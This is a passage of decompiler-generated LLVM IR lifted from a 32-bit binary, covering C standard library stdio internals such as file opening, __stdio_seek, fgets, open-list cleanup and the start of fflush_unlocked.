  %v0_8056ab1.pre = load i32, i32* @ebx, align 4
  br i1 %v8_8056aa5, label %dec_label_pc_8056aab, label %dec_label_pc_8056aa8

dec_label_pc_8056aa8:                             ; preds = %dec_label_pc_8056aa5
  %v11_8056aa8 = or i32 %v0_8056ab1.pre, 32768
  store i32 %v11_8056aa8, i32* @ebx, align 4
  br label %dec_label_pc_8056aab

dec_label_pc_8056aab:                             ; preds = %dec_label_pc_8056aa5, %dec_label_pc_8056aa8
  %v0_8056ab1 = phi i32 [ %v11_8056aa8, %dec_label_pc_8056aa8 ], [ %v0_8056ab1.pre, %dec_label_pc_8056aa5 ]
  %v0_8056ab2 = load i32, i32* @esi, align 4
  store i32 %v0_8056ab2, i32* %stack_var_-76, align 4
  %v3_8056ab3 = inttoptr i32 %v0_8056ab2 to i8*
  %v4_8056ab3 = call i32 @__libc_open(i8* %v3_8056ab3, i32 %v0_8056ab1)
  store i32 %v4_8056ab3, i32* %eax.global-to-local, align 4
  %v1_8056abb = load i32, i32* @ebp, align 4
  %v2_8056abb = add i32 %v1_8056abb, 4
  %v3_8056abb = inttoptr i32 %v2_8056abb to i32*
  store i32 %v4_8056ab3, i32* %v3_8056abb, align 4
  %v2_8056abe = icmp slt i32 %v4_8056ab3, 0
  br i1 %v2_8056abe, label %dec_label_pc_80569ed, label %dec_label_pc_8056ac6

dec_label_pc_8056ac6:                             ; preds = %dec_label_pc_8056aab, %dec_label_pc_8056a9b
  %v0_8056ac6 = load i32, i32* @ebp, align 4
  %v1_8056ac6 = inttoptr i32 %v0_8056ac6 to i16*
  %v2_8056ac6 = load i16, i16* %v1_8056ac6, align 2
  %v3_8056ac6 = and i16 %v2_8056ac6, 8192
  store i16 %v3_8056ac6, i16* %v1_8056ac6, align 2
  %v0_8056acc = load i32, i32* @ebx, align 4
  %v8_8056ace = and i32 %v0_8056acc, -31744
  %v1_8056ad3 = urem i32 %v0_8056acc, 4
  %v1_8056ad6 = add nuw nsw i32 %v1_8056ad3, 1
  store i32 %v1_8056ad6, i32* %eax.global-to-local, align 4
  %v1_8056ad7 = load i32, i32* @ebp, align 4
  %v2_8056ad7 = inttoptr i32 %v1_8056ad7 to i32*
  %v3_8056ad7 = load i32, i32* %v2_8056ad7, align 4
  %v4_8056ad7 = or i32 %v3_8056ad7, %v8_8056ace
  %v1_8056ada = mul nuw nsw i32 %v1_8056ad6, 16
  %v2_8056add = xor i32 %v1_8056ada, 48
  store i32 %v2_8056add, i32* %eax.global-to-local, align 4
  %v2_8056ae0 = or i32 %v4_8056ad7, %v2_8056add
  store i32 %v2_8056ae0, i32* @ebx, align 4
  %v1_8056ae2 = trunc i32 %v2_8056ae0 to i16
  %v3_8056ae2 = inttoptr i32 %v1_8056ad7 to i16*
  store i16 %v1_8056ae2, i16* %v3_8056ae2, align 2
  %v0_8056ae6 = load i32, i32* %stack_var_-76, align 4
  %v1_8056ae6 = call i32 @__errno_location(i32 %v0_8056ae6)
  store i32 %v1_8056ae6, i32* %eax.global-to-local, align 4
  store i32 %v1_8056ae6, i32* @esi, align 4
  %v1_8056af0 = inttoptr i32 %v1_8056ae6 to i32*
  %v2_8056af0 = load i32, i32* %v1_8056af0, align 4
  store i32 %v2_8056af0, i32* @edi, align 4
  %v0_8056af2 = load i32, i32* @ebp, align 4
  %v1_8056af2 = add i32 %v0_8056af2, 4
  %v2_8056af2 = inttoptr i32 %v1_8056af2 to i32*
  %v3_8056af2 = load i32, i32* %v2_8056af2, align 4
  store i32 %v3_8056af2, i32* %stack_var_-76, align 4
  %v1_8056af5 = call i32 @isatty(i32 %v3_8056af2)
  %v2_8056afd = mul i32 %v1_8056af5, 256
  store i32 %v2_8056afd, i32* %eax.global-to-local, align 4
  %v0_8056b00 = load i32, i32* @ebx, align 4
  %v2_8056b00 = or i32 %v0_8056b00, %v2_8056afd
  store i32 %v2_8056b00, i32* @ebx, align 4
  %v1_8056b02 = trunc i32 %v2_8056b00 to i16
  %v2_8056b02 = load i32, i32* @ebp, align 4
  %v3_8056b02 = inttoptr i32 %v2_8056b02 to i16*
  store i16 %v1_8056b02, i16* %v3_8056b02, align 2
  %v0_8056b06 = load i32, i32* @edi, align 4
  %v1_8056b06 = load i32, i32* @esi, align 4
  %v2_8056b06 = inttoptr i32 %v1_8056b06 to i32*
  store i32 %v0_8056b06, i32* %v2_8056b06, align 4
  %v0_8056b08 = load i32, i32* @ebp, align 4
  %v1_8056b08 = add i32 %v0_8056b08, 8
  %v2_8056b08 = inttoptr i32 %v1_8056b08 to i32*
  %v3_8056b08 = load i32, i32* %v2_8056b08, align 4
  %v4_8056b08 = icmp eq i32 %v3_8056b08, 0
  %v1_8056b0c = icmp eq i1 %v4_8056b08, false
  br i1 %v1_8056b0c, label %dec_label_pc_8056b3c, label %dec_label_pc_8056b0e

dec_label_pc_8056b0e:                             ; preds = %dec_label_pc_8056ac6
  store i32 4096, i32* %stack_var_-76, align 4
  %v1_8056b16 = call i32 @malloc(i32 4096)
  store i32 %v1_8056b16, i32* %eax.global-to-local, align 4
  %v1_8056b1e = load i32, i32* @ebp, align 4
  %v2_8056b1e = add i32 %v1_8056b1e, 8
  %v3_8056b1e = inttoptr i32 %v2_8056b1e to i32*
  store i32 %v1_8056b16, i32* %v3_8056b1e, align 4
  %v1_8056b21 = icmp eq i32 %v1_8056b16, 0
  %v0_8056b35 = load i32, i32* @ebp, align 4
  br i1 %v1_8056b21, label %dec_label_pc_8056b35, label %dec_label_pc_8056b25

dec_label_pc_8056b25:                             ; preds = %dec_label_pc_8056b0e
  %v1_8056b25 = inttoptr i32 %v0_8056b35 to i16*
  %v2_8056b25 = load i16, i16* %v1_8056b25, align 2
  %v3_8056b25 = or i16 %v2_8056b25, 16384
  store i16 %v3_8056b25, i16* %v1_8056b25, align 2
  %v1_8056b2b = add i32 %v1_8056b16, 4096
  store i32 %v1_8056b2b, i32* %eax.global-to-local, align 4
  %v1_8056b30 = load i32, i32* @ebp, align 4
  %v2_8056b30 = add i32 %v1_8056b30, 12
  %v3_8056b30 = inttoptr i32 %v2_8056b30 to i32*
  store i32 %v1_8056b2b, i32* %v3_8056b30, align 4
  br label %dec_label_pc_8056b3c

dec_label_pc_8056b35:                             ; preds = %dec_label_pc_8056b0e
  %v1_8056b35 = add i32 %v0_8056b35, 12
  %v2_8056b35 = inttoptr i32 %v1_8056b35 to i32*
  store i32 0, i32* %v2_8056b35, align 4
  br label %dec_label_pc_8056b3c

dec_label_pc_8056b3c:                             ; preds = %dec_label_pc_8056ac6, %dec_label_pc_8056b25, %dec_label_pc_8056b35
  %v0_8056b3c = load i32, i32* @ebp, align 4
  %v1_8056b3c = add i32 %v0_8056b3c, 8
  %v2_8056b3c = inttoptr i32 %v1_8056b3c to i32*
  %v3_8056b3c = load i32, i32* %v2_8056b3c, align 4
  store i32 %v3_8056b3c, i32* %eax.global-to-local, align 4
  %v1_8056b3f = add i32 %v0_8056b3c, 2
  %v2_8056b3f = inttoptr i32 %v1_8056b3f to i8*
  store i8 0, i8* %v2_8056b3f, align 1
  %v0_8056b43 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056b43 = load i32, i32* @ebp, align 4
  %v2_8056b43 = add i32 %v1_8056b43, 24
  %v3_8056b43 = inttoptr i32 %v2_8056b43 to i32*
  store i32 %v0_8056b43, i32* %v3_8056b43, align 4
  %v0_8056b46 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056b46 = load i32, i32* @ebp, align 4
  %v2_8056b46 = add i32 %v1_8056b46, 28
  %v3_8056b46 = inttoptr i32 %v2_8056b46 to i32*
  store i32 %v0_8056b46, i32* %v3_8056b46, align 4
  %v0_8056b49 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056b49 = load i32, i32* @ebp, align 4
  %v2_8056b49 = add i32 %v1_8056b49, 16
  %v3_8056b49 = inttoptr i32 %v2_8056b49 to i32*
  store i32 %v0_8056b49, i32* %v3_8056b49, align 4
  %v0_8056b4c = load i32, i32* %eax.global-to-local, align 4
  %v1_8056b4c = load i32, i32* @ebp, align 4
  %v2_8056b4c = add i32 %v1_8056b4c, 20
  %v3_8056b4c = inttoptr i32 %v2_8056b4c to i32*
  store i32 %v0_8056b4c, i32* %v3_8056b4c, align 4
  %v0_8056b4f = load i32, i32* @ebp, align 4
  %v1_8056b4f = add i32 %v0_8056b4f, 44
  %v2_8056b4f = inttoptr i32 %v1_8056b4f to i32*
  store i32 0, i32* %v2_8056b4f, align 4
  %v0_8056b56 = load i32, i32* @ebp, align 4
  %v1_8056b56 = add i32 %v0_8056b56, 1
  %v2_8056b56 = inttoptr i32 %v1_8056b56 to i8*
  %v3_8056b56 = load i8, i8* %v2_8056b56, align 1
  %v4_8056b56 = and i8 %v3_8056b56, 32
  %v5_8056b56 = icmp eq i8 %v4_8056b56, 0
  %v0_8056b5a = load i32, i32* @global_var_805f670.1031, align 16
  store i32 %v0_8056b5a, i32* @eax, align 4
  %v2_8056b5f = add i32 %v0_8056b56, 52
  %v3_8056b5f = inttoptr i32 %v2_8056b5f to i32*
  store i32 %v0_8056b5a, i32* %v3_8056b5f, align 4
  br i1 %v5_8056b56, label %dec_label_pc_8056bd1, label %dec_label_pc_8056b64

dec_label_pc_8056b64:                             ; preds = %dec_label_pc_8056b3c
  %v2_8056b6f = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8056b6f, i32* %stack_var_-76, align 4
  %v2_8056b74 = call i32 @__pthread_return_void(i32 %v2_8056b6f, i32 134564427)
  store i32 %v2_8056b74, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805f658.923 to i32), i32* %stack_var_-76, align 4
  %v1_8056b80 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805f658.923 to i32))
  store i32 %v1_8056b80, i32* @eax, align 4
  %v2_8056b92 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_8056b92, i32* %stack_var_-76, align 4
  %v2_8056b97 = call i32 @__pthread_return_void(i32 %v2_8056b92, i32 134564427)
  store i32 %v2_8056b97, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805f640.922 to i32), i32* %stack_var_-76, align 4
  %v1_8056ba3 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805f640.922 to i32))
  %v0_8056ba8 = load i32, i32* bitcast (i32** @global_var_805f63c.924 to i32*), align 4
  store i32 %v0_8056ba8, i32* @eax, align 4
  %v1_8056bad = load i32, i32* @ebp, align 4
  %v2_8056bad = add i32 %v1_8056bad, 32
  %v3_8056bad = inttoptr i32 %v2_8056bad to i32*
  store i32 %v0_8056ba8, i32* %v3_8056bad, align 4
  %v0_8056bb0 = load i32, i32* @ebp, align 4
  store i32 %v0_8056bb0, i32* bitcast (i32** @global_var_805f63c.924 to i32*), align 4
  %v2_8056bb6 = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_8056bb6, i32* @ecx, align 4
  store i32 %v2_8056b92, i32* %stack_var_-76, align 4
  %v2_8056bbb = call i32 @__pthread_return_void(i32 %v2_8056b92, i32 1)
  store i32 %v2_8056b92, i32* @eax, align 4
  store i32 1, i32* @edx, align 4
  store i32 %v2_8056b6f, i32* %stack_var_-76, align 4
  %v2_8056bc5 = call i32 @__pthread_return_void(i32 %v2_8056b6f, i32 1)
  store i32 %v2_8056bc5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056bca

dec_label_pc_8056bca:                             ; preds = %dec_label_pc_80569f7, %dec_label_pc_8056b64
  br label %dec_label_pc_8056bd1

dec_label_pc_8056bcf:                             ; preds = %dec_label_pc_80569ed, %dec_label_pc_80569da
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_8056bd1

dec_label_pc_8056bd1:                             ; preds = %dec_label_pc_8056b3c, %dec_label_pc_8056a26, %dec_label_pc_8056bca, %dec_label_pc_8056bcf
  %v0_8056bd4 = load i32, i32* @ebp, align 4
  store i32 %v0_8056bd4, i32* %eax.global-to-local, align 4
  %v2_8056bd6 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8056bd6, i32* @ebx, align 4
  store i32 %v0_80569ae, i32* @esi, align 4
  store i32 %v0_80569ad, i32* @edi, align 4
  store i32 %v0_80569ac, i32* @ebp, align 4
  ret i32 %v0_8056bd4

; uselistorder directives
  uselistorder i32 %v2_8056b92, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_8056b6f, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8056b35, { 1, 0 }
  uselistorder i32 %v1_8056b16, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8056afd, { 1, 0 }
  uselistorder i32 %v1_8056ae6, { 1, 0, 2 }
  uselistorder i32 %v11_8056aa8, { 1, 0 }
  uselistorder i32 %v0_8056ab1.pre, { 1, 0 }
  uselistorder i32 %v1_8056a79, { 1, 0 }
  uselistorder i32 %v0_8056a75, { 1, 0 }
  uselistorder i32 %v1_8056a6a, { 1, 0, 2 }
  uselistorder i32 %v1_8056a2b, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %v0_8056a1a, { 1, 0 }
  uselistorder i32 %v0_80569ed, { 1, 0, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29 }
  uselistorder i32 4096, { 18, 15, 16, 0, 1, 19, 20, 6, 17, 12, 7, 3, 8, 13, 9, 4, 14, 10, 5, 2, 11 }
  uselistorder i32 (i32)* @isatty, { 2, 1, 0 }
  uselistorder i32 (i8*, i32)* @__libc_open, { 2, 5, 0, 1, 3, 4 }
  uselistorder i32 32768, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_fcntl, { 1, 0, 9, 8, 7, 6, 13, 12, 11, 10, 5, 4, 3, 2 }
  uselistorder i32 1024, { 3, 1, 2, 0, 25, 4, 11, 10, 26, 17, 5, 16, 6, 18, 7, 19, 20, 21, 22, 8, 23, 24, 12, 13, 14, 9, 15 }
  uselistorder i32 (i32)* @__stdio_init_mutex, { 3, 2, 1, 0, 4 }
  uselistorder i32 22, { 8, 9, 14, 3, 4, 5, 6, 7, 13, 12, 10, 11, 15, 1, 2, 0 }
  uselistorder i32 577, { 0, 2, 1 }
  uselistorder i32 %arg4, { 0, 2, 1, 4, 3, 5 }
  uselistorder label %dec_label_pc_8056bd1, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_8056bca, { 1, 0 }
  uselistorder label %dec_label_pc_8056b3c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8056aab, { 1, 0 }
  uselistorder label %dec_label_pc_8056a9b, { 1, 0 }
  uselistorder label %dec_label_pc_8056a58, { 1, 0 }
  uselistorder label %dec_label_pc_8056a22, { 1, 0 }
  uselistorder label %dec_label_pc_8056a14, { 1, 0 }
  uselistorder label %dec_label_pc_8056a09, { 2, 0, 1 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp5 = ptrtoint i32* %arg2 to i32
  store i32 %tmp5, i32* @ebx, align 4
  %v1_8056be8 = add i32 %tmp5, 4
  %v2_8056be8 = inttoptr i32 %v1_8056be8 to i32*
  %v3_8056be8 = load i32, i32* %v2_8056be8, align 4
  %v2_8056beb = load i32, i32* %arg2, align 4
  %v1_8056bf1 = add i32 %arg1, 4
  %v2_8056bf1 = inttoptr i32 %v1_8056bf1 to i32*
  %v3_8056bf1 = load i32, i32* %v2_8056bf1, align 4
  %v4_8056bf4 = call i32 @__libc_lseek64(i32 %v3_8056bf1, i32 %v2_8056beb, i32 %v3_8056be8, i32 %arg3)
  %v0_8056bfe = load i32, i32* @edx, align 4
  %v2_8056bfe = icmp slt i32 %v0_8056bfe, 0
  br i1 %v2_8056bfe, label %dec_label_pc_8056c09, label %dec_label_pc_8056c02

dec_label_pc_8056c02:                             ; preds = %entry
  %v1_8056c02 = load i32, i32* @ebx, align 4
  %v2_8056c02 = inttoptr i32 %v1_8056c02 to i32*
  store i32 %v4_8056bf4, i32* %v2_8056c02, align 4
  %v0_8056c04 = load i32, i32* @edx, align 4
  %v1_8056c04 = load i32, i32* @ebx, align 4
  %v2_8056c04 = add i32 %v1_8056c04, 4
  %v3_8056c04 = inttoptr i32 %v2_8056c04 to i32*
  store i32 %v0_8056c04, i32* %v3_8056c04, align 4
  br label %dec_label_pc_8056c09

dec_label_pc_8056c09:                             ; preds = %entry, %dec_label_pc_8056c02
  %v0_8056c09 = phi i32 [ %v4_8056bf4, %entry ], [ 0, %dec_label_pc_8056c02 ]
  ret i32 %v0_8056c09

; uselistorder directives
  uselistorder i32 %tmp5, { 1, 0 }
  uselistorder label %dec_label_pc_8056c09, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_8056c10 = load i32, i32* @edi, align 4
  %v0_8056c11 = load i32, i32* @esi, align 4
  %v0_8056c12 = load i32, i32* @ebx, align 4
  %v12_8056c13 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg3, i32* @esi, align 4
  %v1_8056c1a = add i32 %arg3, 52
  %v2_8056c1a = inttoptr i32 %v1_8056c1a to i32*
  %v3_8056c1a = load i32, i32* %v2_8056c1a, align 4
  store i32 %v3_8056c1a, i32* @edi, align 4
  %v1_8056c1d = icmp eq i32 %v3_8056c1a, 0
  %v1_8056c1f = icmp eq i1 %v1_8056c1d, false
  br i1 %v1_8056c1f, label %entry.dec_label_pc_8056c40_crit_edge, label %dec_label_pc_8056c21

entry.dec_label_pc_8056c40_crit_edge:             ; preds = %entry
  br label %dec_label_pc_8056c40

dec_label_pc_8056c21:                             ; preds = %entry
  %v1_8056c21 = add i32 %arg3, 56
  store i32 %v1_8056c21, i32* @ebx, align 4
  store i32 %v12_8056c13, i32* @eax, align 4
  %v2_8056c30 = call i32 @__pthread_return_void(i32 %v12_8056c13, i32 134564427)
  %v0_8056c35 = load i32, i32* @ebx, align 4
  %v1_8056c38 = call i32 @__pthread_return_0(i32 %v0_8056c35)
  %v0_8056c41.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8056c40

dec_label_pc_8056c40:                             ; preds = %entry.dec_label_pc_8056c40_crit_edge, %dec_label_pc_8056c21
  %v0_8056c41 = phi i32 [ %arg3, %entry.dec_label_pc_8056c40_crit_edge ], [ %v0_8056c41.pre, %dec_label_pc_8056c21 ]
  %v0_8056c40 = load i32, i32* @edx, align 4
  %v4_8056c4a = inttoptr i32 %arg1 to i8*
  %v5_8056c4a = call i32 @__GI_fgets_unlocked(i8* %v4_8056c4a, i32 %arg2, i32 %v0_8056c41, i32 %v0_8056c40)
  store i32 %v5_8056c4a, i32* %ebx.global-to-local, align 4
  br i1 %v1_8056c1f, label %dec_label_pc_8056c69, label %dec_label_pc_8056c58

dec_label_pc_8056c58:                             ; preds = %dec_label_pc_8056c40
  store i32 %v12_8056c13, i32* @eax, align 4
  %v2_8056c61 = call i32 @__pthread_return_void(i32 %v12_8056c13, i32 1)
  %v0_8056c6c.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8056c69

dec_label_pc_8056c69:                             ; preds = %dec_label_pc_8056c40, %dec_label_pc_8056c58
  %v0_8056c6c = phi i32 [ %v5_8056c4a, %dec_label_pc_8056c40 ], [ %v0_8056c6c.pre, %dec_label_pc_8056c58 ]
  store i32 %v0_8056c12, i32* @ebx, align 4
  store i32 %v0_8056c11, i32* @esi, align 4
  store i32 %v0_8056c10, i32* @edi, align 4
  ret i32 %v0_8056c6c

; uselistorder directives
  uselistorder i32 %v12_8056c13, { 2, 3, 0, 1 }
  uselistorder i32 52, { 6, 7, 8, 9, 2, 10, 1, 3, 4, 5, 13, 14, 11, 12, 15, 0 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8056c69, { 1, 0 }
  uselistorder label %dec_label_pc_8056c40, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v2_8056c83 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8056c83, i32* @eax, align 4
  %v2_8056c88 = call i32 @__pthread_return_void(i32 %v2_8056c83, i32 134564427)
  %v1_8056c94 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805f658.923 to i32))
  %v0_8056c99 = load i32, i32* @global_var_80638e4.1029, align 4
  %v8_8056ca1 = icmp eq i32 %v0_8056c99, 1
  %v1_8056ca2 = icmp eq i1 %v8_8056ca1, false
  br i1 %v1_8056ca2, label %dec_label_pc_8056d39, label %dec_label_pc_8056ca8

dec_label_pc_8056ca8:                             ; preds = %entry
  %v0_8056ca8 = load i32, i32* @global_var_80638e8.1030, align 8
  %tmp29 = icmp slt i32 %v0_8056ca8, 1
  br i1 %tmp29, label %dec_label_pc_8056d39, label %dec_label_pc_8056cb5

dec_label_pc_8056cb5:                             ; preds = %dec_label_pc_8056ca8
  store i32 0, i32* @esi, align 4
  %v2_8056cc2 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_8056cc2, i32* @eax, align 4
  %v2_8056cc7 = call i32 @__pthread_return_void(i32 %v2_8056cc2, i32 134564427)
  %v1_8056cd3 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805f640.922 to i32))
  %v0_8056cd8 = load i32, i32* bitcast (i32** @global_var_805f63c.924 to i32*), align 4
  store i32 %v0_8056cd8, i32* %edx.global-to-local, align 4
  %v1_8056d1a3 = icmp eq i32 %v0_8056cd8, 0
  %v1_8056d1c10 = icmp eq i1 %v1_8056d1a3, false
  br i1 %v1_8056d1c10, label %dec_label_pc_8056ce3, label %dec_label_pc_8056d1e

dec_label_pc_8056ce3:                             ; preds = %dec_label_pc_8056cb5, %dec_label_pc_8056d18
  %v0_8056cf3 = phi i32 [ %v0_8056d18, %dec_label_pc_8056d18 ], [ %v0_8056cd8, %dec_label_pc_8056cb5 ]
  %v1_8056ce313 = inttoptr i32 %v0_8056cf3 to i16*
  %v2_8056ce3 = load i16, i16* %v1_8056ce313, align 2
  %v1_8056ceb = add i32 %v0_8056cf3, 32
  %v2_8056ceb = inttoptr i32 %v1_8056ceb to i32*
  %v3_8056ceb = load i32, i32* %v2_8056ceb, align 4
  store i32 %v3_8056ceb, i32* @ebx, align 4
  %v1_8056ce6 = and i16 %v2_8056ce3, -32720
  %v6_8056cee = icmp eq i16 %v1_8056ce6, 48
  br i1 %v6_8056cee, label %dec_label_pc_8056cf7, label %dec_label_pc_8056cf3

dec_label_pc_8056cf3:                             ; preds = %dec_label_pc_8056ce3
  store i32 %v0_8056cf3, i32* @esi, align 4
  br label %dec_label_pc_8056d18

dec_label_pc_8056cf7:                             ; preds = %dec_label_pc_8056ce3
  %v0_8056cf7 = load i32, i32* @esi, align 4
  %v1_8056cf7 = icmp eq i32 %v0_8056cf7, 0
  %v1_8056cf9 = icmp eq i1 %v1_8056cf7, false
  br i1 %v1_8056cf9, label %dec_label_pc_8056d03, label %dec_label_pc_8056cfb

dec_label_pc_8056cfb:                             ; preds = %dec_label_pc_8056cf7
  store i32 %v3_8056ceb, i32* bitcast (i32** @global_var_805f63c.924 to i32*), align 4
  br label %dec_label_pc_8056d06

dec_label_pc_8056d03:                             ; preds = %dec_label_pc_8056cf7
  %v2_8056d03 = add i32 %v0_8056cf7, 32
  %v3_8056d03 = inttoptr i32 %v2_8056d03 to i32*
  store i32 %v3_8056ceb, i32* %v3_8056d03, align 4
  %v0_8056d06.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8056d06

dec_label_pc_8056d06:                             ; preds = %dec_label_pc_8056cfb, %dec_label_pc_8056d03
  %v0_8056d0f = phi i32 [ %v0_8056cf3, %dec_label_pc_8056cfb ], [ %v0_8056d06.pre, %dec_label_pc_8056d03 ]
  %v1_8056d06 = add i32 %v0_8056d0f, 1
  %v2_8056d06 = inttoptr i32 %v1_8056d06 to i8*
  %v3_8056d06 = load i8, i8* %v2_8056d06, align 1
  %v4_8056d06 = and i8 %v3_8056d06, 32
  %v5_8056d06 = icmp eq i8 %v4_8056d06, 0
  br i1 %v5_8056d06, label %dec_label_pc_8056d18, label %dec_label_pc_8056d0c

dec_label_pc_8056d0c:                             ; preds = %dec_label_pc_8056d06
  %v1_8056d10 = call i32 @free(i32 %v0_8056d0f)
  br label %dec_label_pc_8056d18

dec_label_pc_8056d18:                             ; preds = %dec_label_pc_8056d06, %dec_label_pc_8056cf3, %dec_label_pc_8056d0c
  %v0_8056d18 = load i32, i32* @ebx, align 4
  store i32 %v0_8056d18, i32* %edx.global-to-local, align 4
  %v1_8056d1a = icmp eq i32 %v0_8056d18, 0
  %v1_8056d1c = icmp eq i1 %v1_8056d1a, false
  br i1 %v1_8056d1c, label %dec_label_pc_8056ce3, label %dec_label_pc_8056d1e

dec_label_pc_8056d1e:                             ; preds = %dec_label_pc_8056d18, %dec_label_pc_8056cb5
  store i32 %v2_8056cc2, i32* @eax, align 4
  %v2_8056d27 = call i32 @__pthread_return_void(i32 %v2_8056cc2, i32 1)
  store i32 0, i32* @global_var_80638e8.1030, align 8
  %v0_8056d39.pre = load i32, i32* @global_var_80638e4.1029, align 4
  br label %dec_label_pc_8056d39

dec_label_pc_8056d39:                             ; preds = %dec_label_pc_8056ca8, %entry, %dec_label_pc_8056d1e
  %v0_8056d39 = phi i32 [ %v0_8056c99, %dec_label_pc_8056ca8 ], [ %v0_8056c99, %entry ], [ %v0_8056d39.pre, %dec_label_pc_8056d1e ]
  %v1_8056d3e = add i32 %v0_8056d39, -1
  store i32 %v1_8056d3e, i32* @global_var_80638e4.1029, align 4
  store i32 %v2_8056c83, i32* @eax, align 4
  %v2_8056d4d = call i32 @__pthread_return_void(i32 %v2_8056c83, i32 1)
  ret i32 %v2_8056d4d

; uselistorder directives
  uselistorder i32 %v0_8056d18, { 1, 2, 0 }
  uselistorder i32 %v0_8056cf3, { 1, 2, 3, 0 }
  uselistorder i32 %v0_8056c99, { 1, 2, 0 }
  uselistorder i32 (i32)* @free, { 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 1, 6, 5, 4, 3, 2, 21, 20, 19, 18, 0 }
  uselistorder label %dec_label_pc_8056d39, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056d18, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056d06, { 1, 0 }
  uselistorder label %dec_label_pc_8056ce3, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %v0_8056d58 = load i32, i32* @ebp, align 4
  %v0_8056d59 = load i32, i32* @edi, align 4
  %v0_8056d5a = load i32, i32* @esi, align 4
  %v0_8056d5b = load i32, i32* @ebx, align 4
  store i32 0, i32* @ebp, align 4
  %v4_8056d61 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8056d61, i32* @ebx, align 4
  %v10_8056d65 = icmp eq i16* %arg1, inttoptr (i32 134608444 to i16*)
  br i1 %v10_8056d65, label %dec_label_pc_8056d7a, label %dec_label_pc_8056d6d

dec_label_pc_8056d6d:                             ; preds = %entry
  store i32 256, i32* @ebp, align 4
  %v2_8056d72 = icmp eq i16* %arg1, null
  %v1_8056d74 = icmp eq i1 %v2_8056d72, false
  br i1 %v1_8056d74, label %dec_label_pc_8056e69, label %dec_label_pc_8056d7a

dec_label_pc_8056d7a:                             ; preds = %dec_label_pc_8056d6d, %entry
  store i32 0, i32* @edi, align 4
  %v2_8056d87 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8056d87, i32* @ebx, align 4
  %v2_8056d8c = call i32 @__pthread_return_void(i32 %v2_8056d87, i32 134564427)
  %v1_8056d98 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805f658.923 to i32))
  store i32 ptrtoint (i32* @global_var_805f658.923 to i32), i32* @ecx, align 4
  %v0_8056d9e = load i32, i32* @global_var_80638e4.1029, align 4
  %v1_8056da4 = add i32 %v0_8056d9e, 1
  store i32 %v1_8056da4, i32* @eax, align 4
  store i32 %v1_8056da4, i32* @global_var_80638e4.1029, align 4
  %v2_8056dad = call i32 @__pthread_return_void(i32 %v2_8056d87, i32 1)
  store i32 %v2_8056dad, i32* @eax, align 4
  %v2_8056dc0 = call i32 @__pthread_return_void(i32 %v2_8056d87, i32 134564427)
  %v1_8056dcc = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805f640.922 to i32))
  store i32 ptrtoint (i32* @global_var_805f640.922 to i32), i32* @eax, align 4
  %v0_8056dd5 = load i32, i32* bitcast (i32** @global_var_805f63c.924 to i32*), align 4
  store i32 %v0_8056dd5, i32* @esi, align 4
  %v2_8056ddc = call i32 @__pthread_return_void(i32 %v2_8056d87, i32 1)
  %v0_8056e5e1 = load i32, i32* @esi, align 4
  %v1_8056e5e2 = icmp eq i32 %v0_8056e5e1, 0
  %v1_8056e609 = icmp eq i1 %v1_8056e5e2, false
  br i1 %v1_8056e609, label %dec_label_pc_8056de6, label %dec_label_pc_8056e62

dec_label_pc_8056de6:                             ; preds = %dec_label_pc_8056d7a, %dec_label_pc_8056e5b
